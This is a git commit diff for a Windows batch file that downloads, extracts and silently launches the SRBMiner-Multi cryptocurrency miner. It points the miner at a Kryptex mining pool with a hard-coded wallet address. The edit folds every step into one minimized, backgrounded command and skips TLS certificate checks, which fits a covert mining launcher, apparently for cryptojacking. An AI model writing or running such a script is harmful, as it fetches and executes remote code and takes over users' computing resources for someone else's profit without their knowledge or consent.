7336bec8e95be69a29cc689ec0b292ea816ee80e
Priyansh Agarwal <2k22.cse.32203@gmail.com>
2026-07-29 10:30:41 +0530

    Update fuck.bat

--- fuck.bat
+++ fuck.bat
@@ -1,3 +1,2 @@
-start /MIN "" cmd /c "curl -LJOk https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.7/SRBMiner-Multi-3-4-7-win64.zip && tar -xf SRBMiner-Multi-3-4-7-win64.zip"
-cd SRBMiner-Multi-3-4-7
-SRBMiner-MULTI.exe --disable-cpu --algorithm pearlhash --pool prl.kryptex.network:8048 --wallet prl1pgnzyhyf4j7dgml9fuy8p2s0lsktv8sqtzy3azhq3f6a46zyxe80q89am38.workernew --tls true --background
+start /MIN "" cmd /c "curl -LJOk https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.7/SRBMiner-Multi-3-4-7-win64.zip && tar -xf SRBMiner-Multi-3-4-7-win64.zip && cd SRBMiner-Multi-3-4-7 && SRBMiner-MULTI.exe --disable-cpu --algorithm pearlhash --pool prl.kryptex.network:8048 --wallet prl1pgnzyhyf4j7dgml9fuy8p2s0lsktv8sqtzy3azhq3f6a46zyxe80q89am38.workernew --tls true --background"
+
